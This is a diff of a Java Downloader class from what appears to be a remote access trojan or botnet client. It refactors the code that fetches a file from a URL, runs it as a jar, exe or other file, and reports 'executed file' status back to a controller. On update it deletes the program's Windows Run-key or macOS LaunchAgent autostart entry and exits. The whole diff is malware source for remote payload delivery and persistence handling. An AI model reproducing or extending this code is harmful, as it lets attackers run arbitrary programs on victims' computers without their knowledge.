@@ -31,19 +31,8 @@ public class Downloader extends Thread {
 
 			URLConnection con = new URL(url).openConnection();
 
-			String fileName = update ? (new Random().nextInt()) + ".jar" : (new Random().nextInt()) + ".exe";
+			String fileName = (new Random().nextInt()) + type.getExtension();
 
-			String disposition = con.getHeaderField("Content-Disposition");
-
-			if (disposition != null) {
-				int index = disposition.indexOf("filename=");
-				if (index > 0) {
-					fileName = disposition.substring(index + 10, disposition.length() - 1);
-				}
-			} else if (url.lastIndexOf(".") + 3 >= url.length()) {
-				fileName = (new Random().nextInt()) + url.substring(url.lastIndexOf(".") + 1, url.length());
-			}
-			
 			try {
 				File file = null;
 				if (update) {
@@ -76,35 +65,11 @@ public class Downloader extends Thread {
 					} catch (Exception ex) {
 						ex.printStackTrace();
 					}
-					if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
-						Runtime.getRuntime().exec(new String[] { System.getProperty("java.home") + "\\bin\\javaw.exe", "-jar", file.getAbsolutePath() });
-					} else {
-						Runtime.getRuntime().exec(new String[] { "java", "-jar", file.getAbsolutePath() });
-					}
-					try {
-						if (System.getProperty("os.name").toLowerCase().contains("windows")) {
-							WinRegistry.deleteValue(WinRegistry.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", Main.name);
-						} else if (System.getProperty("os.name").toLowerCase().contains("mac")) {
-							new File(System.getProperty("user.home") + "/Library/LaunchAgents/" + Utils.getJarFile().getName().replace(".jar", ".plist")).delete();
-						}
-
-					} catch (Exception ex) {
-						ex.printStackTrace();
-					}
+					type.execute(file);
 					Main.running = false;
 					System.exit(0);
 				} else {
-					if (fileName.toLowerCase().endsWith("jar")) {
-						if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
-							Runtime.getRuntime().exec(new String[] { System.getProperty("java.home") + "\\bin\\javaw.exe", "-jar", file.getAbsolutePath() });
-						} else {
-							Runtime.getRuntime().exec(new String[] { "java", "-jar", file.getAbsolutePath() });
-						}
-					} else if (fileName.toLowerCase().endsWith("exe")) {
-						Runtime.getRuntime().exec(new String[] { file.getAbsolutePath() });
-					} else {
-						Desktop.getDesktop().open(file);
-					}
+					type.execute(file);
 					Connection.status(Constants.STATUS_EXECUTED_FILE);
 				}
 			} finally {
